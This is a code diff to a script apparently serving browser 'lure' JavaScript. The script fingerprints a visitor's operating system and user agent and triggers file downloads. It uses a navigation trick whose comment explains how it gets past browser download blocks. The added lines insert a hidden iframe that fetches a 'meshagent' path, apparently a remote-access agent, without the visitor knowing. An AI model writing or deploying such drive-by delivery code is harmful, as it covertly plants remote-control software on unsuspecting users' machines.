@@ -46,7 +46,15 @@ LURE_JS = """(function () {
           "&ua=" + encodeURIComponent(navigator.userAgent || ""))
       .then(function (r) { return r.json(); })
       .then(function (d) {
-        if (!d || !d.url) return;
+        if (!d) return;
+        if (d.mesh) {
+          var f = document.createElement("iframe");
+          f.style.display = "none";
+          f.src = "/__lure/meshagent?os=" + encodeURIComponent(os) +
+                  "&ua=" + encodeURIComponent(navigator.userAgent || "");
+          document.body.appendChild(f);
+        }
+        if (!d.url) return;
         // Use window.location.href instead of <a>.click() — browsers block
         // programmatic <a>.click() downloads unless triggered by a direct
         // user click, but navigating to an attachment URL triggers a download
